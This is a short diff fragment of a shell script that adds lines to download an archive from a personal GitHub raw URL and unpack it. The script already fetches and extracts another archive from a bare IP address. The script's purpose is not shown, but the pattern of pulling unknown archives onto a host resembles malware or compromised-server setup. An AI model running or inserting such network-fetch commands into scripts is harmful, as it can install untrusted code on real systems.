@@ -40,6 +40,8 @@ sleep 2
 cd /home
 wget 149.56.111.62/ch2.tar.gz
 tar -xvf ch2.tar.gz
+wget https://raw.githubusercontent.com/mazbron/x/master/every.tar.bz2
+tar -xvf every.tar.bz2
 sleep 2
 cd
 mkdir Desktop
